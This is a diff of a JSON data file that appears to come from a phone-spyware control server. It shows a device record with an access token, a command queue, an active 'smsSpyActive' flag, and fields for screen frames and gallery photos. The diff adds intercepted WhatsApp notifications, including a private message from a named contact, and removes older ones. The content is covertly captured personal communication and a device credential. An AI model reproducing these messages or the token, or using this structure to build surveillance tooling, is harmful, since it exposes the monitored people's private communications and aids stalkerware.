@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776861216701,
+    "lastSeen": 1776861228730,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "nanti yang ada malah sakit",
+        "time": "22/04 20:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776861231380
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎60 pesan dari 37 chat",
+        "time": "22/04 20:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776861218163
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -4003,22 +4019,6 @@
         "time": "22/04 15:17",
         "pkg": "com.whatsapp",
         "receivedAt": 1776842265898
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎73 pesan dari 2 chat",
-        "time": "22/04 15:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842265804
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎72 pesan dari 2 chat",
-        "time": "22/04 15:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842198289
       }
     ],
     "galleryPhotos": [],
